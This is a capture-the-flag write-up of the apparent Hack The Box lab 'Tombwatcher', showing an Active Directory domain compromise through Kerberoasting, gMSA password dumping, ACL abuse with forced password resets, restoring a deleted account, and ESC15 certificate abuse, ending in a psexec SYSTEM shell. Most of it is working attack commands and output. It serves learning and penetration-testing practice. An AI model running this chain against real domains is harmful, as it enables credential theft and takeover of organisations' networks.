# Tombwatcher

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -p- -sC -sC -T4 tombwatcher.htb 
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-09-24 13:24 EDT
Nmap scan report for tombwatcher.htb (10.10.11.72)
Host is up (0.034s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
|_ssl-date: 2025-09-24T21:29:20+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
|_ssl-date: 2025-09-24T21:27:46+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
|_ssl-date: 2025-09-24T21:27:47+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49693/tcp open  unknown
49711/tcp open  unknown
49714/tcp open  unknown
49734/tcp open  unknown

Host script results:
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-24T21:27:48
|_  start_date: N/A
```

SMB

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' --shares 
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share
```

Users

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' --users 
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.72     445    DC01             Administrator                 2025-04-25 14:56:03 0       Built-in account for administering the computer/domain 
SMB         10.10.11.72     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.72     445    DC01             krbtgt                        2024-11-16 00:02:28 0       Key Distribution Center Service Account 
SMB         10.10.11.72     445    DC01             Henry                         2025-05-12 15:17:03 0        
SMB         10.10.11.72     445    DC01             Alfred                        2025-05-12 15:17:03 0        
SMB         10.10.11.72     445    DC01             sam                           2025-05-12 15:17:03 0        
SMB         10.10.11.72     445    DC01             john                          2025-05-19 13:25:10 0        
SMB         10.10.11.72     445    DC01             [*] Enumerated 7 local users: TOMBWATCHER
```

Nothing to be found, so we run bloodhound

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fv2r2SEv8Cgekwfp4md68%2Fimage.png?alt=media&#x26;token=11942333-5ba2-4dc7-a44b-1ec51cf79135" alt=""><figcaption></figcaption></figure>

WriteSPN ⇒ We can input a fake SPN for that user ⇒ we can kerberoast him

```bash
./targetedKerberoast.py -v -d 'TOMBWATCHER.HTB' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
Traceback (most recent call last):
  File "/home/kali/Downloads/./targetedKerberoast.py", line 597, in main
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,
                                             ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                            aesKey=args.auth_aes_key, kdcHost=args.dc_ip)
                                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 323, in getKerberosTGT
    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

We get a clock skew too great, so we sync our time with the DC

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo rdate -n 10.10.11.72
Wed Sep 24 17:59:36 EDT 2025
```

We run our script and get a hash for alfred

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ./targetedKerberoast.py -v -d 'TOMBWATCHER.HTB' -u 'henry' -p 'H3nry_987TGV!' --dc-ip 10.10.11.72
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$TOMBWATCHER.HTB/Alfred*$ff8320550817506ded908756b69a9a79$3da5a91f7d13c4bb6b516f28936dbf5348ab66b101f78df38e8389e17e50b88aaaea0ed3f19eda431b3ae403842d0dec540d9f1fc2f5ac1f7cdc6b2b1621a53167ab4aa927921446be8effe487629b330c0de7aaf5344daa78dfe7f52c1dfb2dc98dd7f0f6a923c706a0fd40ff76256358322254805cb7cf6d49e98c81cd9bb9e5d34518ca950691672ba1690d350cb9e25a6fc7bb053b005670388e8c2f50ee67fbd44fd492965cb17f4a2bf3c3b83542ebc03a547a2757a187ceaff37ca2b1639b905bd14ecadfba08807065862feb7b9a8b414074ee119dae4d6ddcc463dc829d134a3a1a5406c57a26ae459da6e7bcfbc1be7dd982b0efe069f9c659dcdf4441062c138b8471c5ccab58a402dcb528748626ee839684600e9422d27d903965c2b2976cbbc180d416df8ea705e7c31e9026c9e4926b5cf6c2aafcbe36900cff200ec6f803e5dd487b767f8dbcdf273adda43affad754c873c03202ca899524934e00bcd9d9dd5e4278490ffbc54a2bfb683f53b8ef17687dd45cd1116c66430587fbfcaead1c8f83a1c7af7c9ceb9045bfb36820eda58a57246dccae57ddd369fc26d69e0196f99c84244d646be9a419594400395e694f13d7e9bed7df82fe92b05e25fe2b51888c12c3edf9e2122590beadc3419b49599ce6c1c428290cb324c55108f5c7f26762eede0d73208841b855eebcdb3af2cfae1521898ccf4d2e7751cc0ed486fb2527b4dc0a0f6fea8409cde7b0a0dd69eb14d0c368aedb53343e5f98215b514cd125b6729b410e47d287823d958ba3473e0a75118abb9ad0232a8caa47f314a2ec2881068688077dc6ffa39600d7fb9a2f32da0ee83b8d5c0e2e19a8caac5dec3a4ffb04de7ef633b50439275987d4dfbfb09765efa3d63409f161a05eb946d224164bd944bc72ec5a10f2bba5850c7f564e44aaf86b068daf618d7939e3243b99de7738f7bc3875ea1cd4bfb46f495cf6bdc6da2da74ccf75f2374d822ec3e441435120874a808cbf0788117514d79dd90e566c6cf905b2f8886746c0c0d9539ce9db99cced1ccdcc3bb2551429ea19c07b65bdc8b76b245d39f81f435b2807822e21045b129d95b9d0a66ad0d11d72dca13ca9be42657c224fb5b41f7b3031254d1f281d442e5a0d8c88b6914bf80584ddec44f6438162ab319cf587a7f247c2844bf0c01ef2be1964a2812409d0ae07b2809691bc268f8bea4998fc6c8e47cf7b282f8e98e03a7e27986dd00d22f8eb512014da94bb06ddd90df6f5deb0924340ea17a6526fb3282623fd1fa4f1dfaa8dd674b8693edec054077d984acb46bf036ad9edfd1c683a713dbe2becb6d2d2c4a13362a6a0c0c62a1a1bf760a7407dbddb474b4457a26452205b8c0bfde340f51cd4513c5de49640ee8722ff94a23619c825c36132642f57db98bf71d840d044e12a804c203fa835017ef209235eb79ee3310feb0569225b57eac1c
[VERBOSE] SPN removed successfully for (Alfred)
```

Now time to crack that hash

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

We get alfred:basketball

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb tombwatcher.htb -u 'Alfred' -p 'basketball'                                                               
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\Alfred:basketball
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FDXsq2Igv7cfikwWq1RFn%2Fimage.png?alt=media&#x26;token=a8227b58-c9b7-4ded-9d14-d06870923c9d" alt=""><figcaption></figcaption></figure>

AddSelf ⇒ can add a user to the target group

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d TOMBWATCHER.HTB --host tombwatcher.htb -u Alfred -p 'basketball' add groupMember 'Infrastructure' Alfred
[+] Alfred added to Infrastructure
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -d TOMBWATCHER.HTB --host tombwatcher.htb -u Alfred -p 'basketball' get object 'Infrastructure'

distinguishedName: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb
```

OR

```bash
net rpc group addmem "Infrastructure" "Alfred" -U "TOMBWATCHER"/"Alfred"%"basketball" -S "tombwatcher.htb"

┌──(kali㉿kali)-[~/Downloads]
└─$ net rpc group members "Infrastructure" -U "TOMBWATCHER"/"Alfred"%"basketball" -S tombwatcher.htb
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FpCPIUnh45N2jHYC4qhVr%2Fimage.png?alt=media&#x26;token=567ce7d4-d966-4d00-baf2-dacc23ede27a" alt=""><figcaption></figcaption></figure>

Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute). The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD -u Alfred -d TOMBWATCHER -p 'basketball' --host tombwatcher.htb get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword

distinguishedName: CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:4f46405647993c7d4e1dc1c25dd6ecf4
msDS-ManagedPassword.B64ENCODED: CKBB2DXgLKS7donF49VLpNdiEasgRcFRpcKIZvVUdSrGXsLZFrXW9EiLlE6UiJDzC/wGwVWftapdAqphuLkFW9wzalzrLtDnCa/KgkgiBIaqPsMIwhp2RDsnFXgN6IzvGycs9M9z/yjjvcGbYFV6ViOjLIzvRZM3CYokX5+3X3FK4R+CsQ4nBGPqU8uf7tUYNgiIeUiUM1UBAsqUTeVDoFaJMmnOkxRXiu8oLb0/GhfEWke2Ljok5eWHuF/Xp8uKXhI35pfjAy+vAgc3rcfdfBF4qYRFauDf950jhTkqNkGkprGmPOIgnn8GZ9ADskqXUYvUkpawHOxGUSb05CFGZw==
```

OR

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 gMSADumper.py -u Alfred -p basketball -d 'TOMBWATCHER.HTB'                                                       
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::4f46405647993c7d4e1dc1c25dd6ecf4
ansible_dev$:aes256-cts-hmac-sha1-96:2712809c101bf9062a0fa145fa4db3002a632c2533e5a172e9ffee4343f89deb
ansible_dev$:aes128-cts-hmac-sha1-96:d7bda16ace0502b6199459137ff3c52d
```

We have the NTLM hash for ansible\_dev$:4f46405647993c7d4e1dc1c25dd6ecf4

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fe1UFAfl5b4P7ms17uWTo%2Fimage.png?alt=media&#x26;token=39af5480-8dfa-4d7c-9b22-91bb818f6834" alt=""><figcaption></figcaption></figure>

We can force the password change for the user sam

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD --host tombwatcher.htb -d TOMBWATCHER -u 'ansible_dev$' -p :4f46405647993c7d4e1dc1c25dd6ecf4 set password 'sam' 'Samurmine1!'
[+] Password changed successfully!
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb tombwatcher.htb -u 'sam' -p 'Samurmine1!'                                                                 
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\sam:Samurmine1!
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F6DvkEq96h1cPhHr7vtI5%2Fimage.png?alt=media&#x26;token=1541ad23-d06e-4345-bd32-5200b0afc724" alt=""><figcaption></figcaption></figure>

The `WriteOwner` permission allows a user to change the ownership of an object to a different user or principal, including one controlled by an attacker. By exploiting this permission, an attacker can take ownership of a target object.

Once the attacker successfully changes the ownership of the object to a principal under their control, they gain the ability to fully manipulate the object. This includes modifying permissions to grant themselves or others full control over the object. For example, the attacker could grant “Full Control” permissions, allowing unrestricted access to read, write, or delete the object.

* WriteOwner permissions on a **group** allow granting the right to add members to that group.
* WriteOwner permissions on a **user** allow granting full control over the user object.
* WriteOwner permissions on a **computer** object allow granting full control over the computer object.
* WriteOwner permissions on a **domain** object allow granting the ability to perform a DCSync operation.

Change the ownership of the john user to us

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-owneredit -new-owner 'sam' -target 'john' -action write 'TOMBWATCHER.HTB'/'sam':'Samurmine1!' -dc-ip 10.10.11.72

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

Now we give ourself full control over him

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-dacledit -rights FullControl -principal 'sam' -target 'john' -action write 'TOMBWATCHER.HTB'/'sam':'Samurmine1!' -dc-ip 10.10.11.72

[*] DACL backed up to dacledit-20250924-214243.bak
[*] DACL modified successfully!
```

Now we can change his password

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD --host tombwatcher.htb -d TOMBWATCHER -u 'sam' -p 'Samurmine1!' set password 'john' 'Johnurmine1!'
[+] Password changed successfully!
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb tombwatcher.htb -u 'john' -p 'Johnurmine1!'
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\john:Johnurmine1!
```

John is part of Remote Management

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FhPAKFlVbvnHU94yzXD7g%2Fimage.png?alt=media&#x26;token=c43fe720-b32f-4b03-a3db-b1fdf4a7356e" alt=""><figcaption></figcaption></figure>

We can indeed winRM as john

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc winrm tombwatcher.htb -u 'john' -p 'Johnurmine1!'                                                   
WINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.72     5985   DC01             [+] tombwatcher.htb\\john:Johnurmine1! (Pwn3d!)
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i tombwatcher.htb -u 'john' -p 'Johnurmine1!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\john\\Documents> ls ../Desktop

    Directory: C:\\Users\\john\\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/24/2025   7:45 PM             34 user.txt
```

John also has GenericAll over ADCS OU

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fh7wTeQROwZ1AuI8LAizj%2Fimage.png?alt=media&#x26;token=8883cd31-9aae-4be2-8f1d-d38405e153bc" alt=""><figcaption></figcaption></figure>

We try to get informations about the certificate templates

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad find -u 'john@tombwatcher.htb' -p 'Johnurmine1!' -dc-ip 10.10.11.72 -stdout -enabled 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'tombwatcher-CA-1' via CSRA
[!] Got error while trying to get CA configuration for 'tombwatcher-CA-1' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'tombwatcher-CA-1' via RRP
[*] Got CA configuration for 'tombwatcher-CA-1'
[!] Failed to lookup user with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Enumeration output:
Certificate Authorities

4
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : AttestNone
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\\Domain Admins
                                          TOMBWATCHER.HTB\\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\\Domain Admins
                                          TOMBWATCHER.HTB\\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\\Domain Admins
                                          TOMBWATCHER.HTB\\Enterprise Admins
        Write Property Principals       : TOMBWATCHER.HTB\\Domain Admins
                                          TOMBWATCHER.HTB\\Enterprise Admins
```

We find that the template for web server is intereting. We wonder who is that user SID

We enumerate the delected users (we are supposed to get the idea from the box title ?)

```bash
*Evil-WinRM* PS C:\\Users\\john\\Documents> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List

Name            : cert_admin
                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1109
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1110
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb
```

We see our user ending the the 1111 SID. We can restore his account

```bash
*Evil-WinRM* PS C:\\Users\\john\\Documents> Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'
*Evil-WinRM* PS C:\\Users\\john\\Documents> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List

Name            : cert_admin
                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1109
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1110
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb
```

As we saw on the bllodhound output, john has genericAll on the ADCS group, cert\_admin is part of this OU, so we can change his password

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FTO9SF28tdPpMlTGUU76G%2Fimage.png?alt=media&#x26;token=609e9f7f-2cfa-4183-9d0c-5f7726895cf9" alt=""><figcaption></figcaption></figure>

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD --host tombwatcher.htb -d tombwatcher -u john -p 'Johnurmine1!' set password cert_admin 'Certurmine1!'
[+] Password changed successfully!
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb tombwatcher.htb -u 'cert_admin' -p 'Certurmine1!'                                               
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\cert_admin:Certurmine1!
```

Now enumerate vulnerable template with the new account

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad find -u 'cert_admin@tombwatcher.htb' -p 'Certurmine1!' -dc-ip 10.10.11.72 -stdout -vulnerable -enabled
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities

Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\\Domain Admins
                                          TOMBWATCHER.HTB\\Enterprise Admins
                                          TOMBWATCHER.HTB\\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\\Domain Admins
                                          TOMBWATCHER.HTB\\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\\Domain Admins
                                          TOMBWATCHER.HTB\\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\\Domain Admins
                                          TOMBWATCHER.HTB\\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\\Domain Admins
                                          TOMBWATCHER.HTB\\Enterprise Admins
                                          TOMBWATCHER.HTB\\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

The environment is vulnerable to ESC15

```bash
# Get the Administrator account SID
*Evil-WinRM* PS C:\\Users\\john\\Documents> (Get-ADUser -Identity Administrator).SID

BinaryLength AccountDomainSid                          Value
------------ ----------------                          -----
          28 S-1-5-21-1392491010-1358638721-2126982587 S-1-5-21-1392491010-1358638721-2126982587-500

# Request certificate for Administrator
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Certurmine1!' -dc-ip 10.10.11.72 -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template WebServer -upn administrator@tombwatcher.htb -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

# Change the admin password from the ldap shell
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     SAN URL SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\\\Administrator'
Type help for list of commands

# change_password Administrator
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: +[\\hlI{6sZ38},T
Password changed successfully!

# change_password Administrator Hacked@123!
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: Hacked@123!
Password changed successfully!

```

Log in as Admin through psexec

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-psexec TOMBWATCHER/Administrator:'Hacked@123!'@10.10.11.72
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.72.....
[*] Found writable share ADMIN$
[*] Uploading file JZxRFQZx.exe
[*] Opening SVCManager on 10.10.11.72.....
[*] Creating service ZVOY on 10.10.11.72.....
[*] Starting service ZVOY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6414]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> whoami
nt authority\\system

```
